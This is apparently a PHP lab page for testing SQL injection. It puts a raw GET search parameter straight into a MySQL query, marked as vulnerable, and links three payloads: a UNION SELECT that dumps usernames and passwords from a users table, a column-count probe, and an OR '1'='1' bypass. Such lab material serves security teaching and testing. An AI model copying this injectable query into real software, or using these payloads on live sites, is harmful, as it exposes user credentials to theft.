<?php
/**
 * Trang Test SQL Injection
 * Dùng để debug và verify SQL injection payload
 */
require_once 'config.php';

// Get search parameter
$search = $_GET['search'] ?? '';

echo "<h1>SQL Injection Test Page</h1>";
echo "<p><strong>Input:</strong> " . htmlspecialchars($search) . "</p>";

if ($search) {
    // Build query - VULNERABLE!
    $query = "SELECT * FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'";
    
    echo "<p><strong>Query:</strong> <code>" . htmlspecialchars($query) . "</code></p>";
    
    $result = mysqli_query($conn, $query);
    
    if (!$result) {
        echo "<p style='color: red;'><strong>SQL Error:</strong> " . mysqli_error($conn) . "</p>";
    } else {
        $num_rows = mysqli_num_rows($result);
        echo "<p><strong>Results:</strong> $num_rows rows</p>";
        
        if ($num_rows > 0) {
            echo "<table border='1' cellpadding='10'>";
            
            // Show column names
            echo "<tr>";
            $fields = mysqli_fetch_fields($result);
            foreach ($fields as $field) {
                echo "<th>" . htmlspecialchars($field->name) . "</th>";
            }
            echo "</tr>";
            
            // Show data
            while ($row = mysqli_fetch_assoc($result)) {
                echo "<tr>";
                foreach ($row as $value) {
                    echo "<td>" . htmlspecialchars($value ?? 'NULL') . "</td>";
                }
                echo "</tr>";
            }
            echo "</table>";
        }
    }
}
?>

<hr>
<h2>Test Payloads</h2>
<ul>
    <li><a href="?search=%25%27+UNION+SELECT+id%2Cusername%2Cpassword%2Cemail%2Cfull_name%2Cphone%2Caddress%2Crole%2Ccreated_at+FROM+users%23">Payload 1: Dump Users (9 columns)</a></li>
    <li><a href="?search=%25%27+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%23">Payload 2: Test 9 columns</a></li>
    <li><a href="?search=%25%27+OR+%271%27%3D%271">Payload 3: Bypass filter</a></li>
</ul>
